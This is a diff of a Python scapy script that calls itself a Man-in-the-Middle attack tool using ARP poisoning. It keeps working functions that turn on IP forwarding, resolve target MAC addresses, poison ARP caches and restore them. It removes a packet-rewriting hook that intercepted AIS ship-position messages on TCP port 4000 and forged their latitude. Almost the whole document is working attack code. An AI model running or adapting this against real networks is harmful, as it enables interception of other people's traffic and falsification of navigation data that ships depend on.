@@ -1,6 +1,9 @@
+'''
+Script to perform Man-in-The-Middle attacks, using ARP poisoning.
+'''
+
 from tabnanny import verbose
 from scapy.all import *
-from netfilterqueue import NetfilterQueue
 import os
 import time
 import sys
@@ -14,52 +17,14 @@ class MITM:
         self.iface = iface
         self.src_mac = None
         self.target_mac = None
-        self.nfqueue = NetfilterQueue()
         self.pkt = None
-
-    def modify(self, packet):
-        #self.arp_poison()
-        
-        pkt = packet.get_payload()
-        pktIP = IP(pkt)
-        
-        payload = "".join(map(chr, bytes(pktIP[TCP].payload)))
-        print(payload.startswith("!AIVDM"))
-        
-        try:
-            if pktIP.haslayer(TCP) and pktIP.src == self.src_ip and pktIP[TCP].dport == 4000 and payload.startswith("!AIVDM"):
-            
-                print(f"[*] Packet Intercepted with payload \n{pktIP[TCP].payload}")
-                ais_data = AIS_NMEA(bytes(pktIP[TCP].payload))
-
-                #print(f"[*] Decoded: {ais_data.decoded_dict}")
-                old_len = len(pktIP[TCP].payload)
-                pktIP[TCP].remove_payload()
-
-                ais_data.alter_field('lat', 48.475577)
-                pktIP[TCP].add_payload(ais_data.modified_sentence[0])
-                print(f"\npacket modified..{pktIP[TCP].payload}")
-                new_len = len(pktIP[TCP].payload)
-                pktIP[IP].len = pktIP[IP].len + (new_len - old_len)
-                del pktIP[IP].chksum
-                del pktIP[TCP].chksum
-                #del pktIP[TCP].len
-                #pktIP.show2()
-                pkt = pktIP.__class__(bytes(pktIP))
-                packet.set_payload(bytes(pkt))
-        except Exception as e:
-           print(e)
-           
-        packet.accept()
-        #self.arp_poison()
-
+    
+    # enables ip forwarding
     def setup(self):
-        #iptable_config = f"sudo iptables -A FORWARD -j NFQUEUE --queue-num 0 -d {self.target_ip}"
         ip_forward = "sudo sysctl net.ipv4.ip_forward=1"
-        #os.system(iptable_config)
         os.system(ip_forward)
-        #self.nfqueue.bind(0, self.modify)
 
+    # Get's MAC address of the targets
     def get_mac(self, ip):
         try:
             resp = srp1(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
@@ -71,6 +36,7 @@ class MITM:
             print(f"[!] Could not find MAC address for {ip}")
             print(f"[!] Exiting....")
 
+    # Restore to original MAC
     def re_arp(self):
         try:
             print("[*] Restoring Targets MAC")
@@ -82,6 +48,7 @@ class MITM:
             print("[!] Error while restoring targets..")
             print("[!] Exiting.....")
 
+    # starts ARP poisoning
     def arp_poison(self):
         try:
             print(".")
@@ -92,9 +59,6 @@ class MITM:
             print("[!] Exiting")
 
     def clean_up(self):
-        #print("[*] Flushing iptables")
-        #os.system('iptables -F')
-        #os.system('iptables -X')
         print("[*] Disabling IP forwarding")
         os.system("sudo sysctl net.ipv4.ip_forward=0")
 
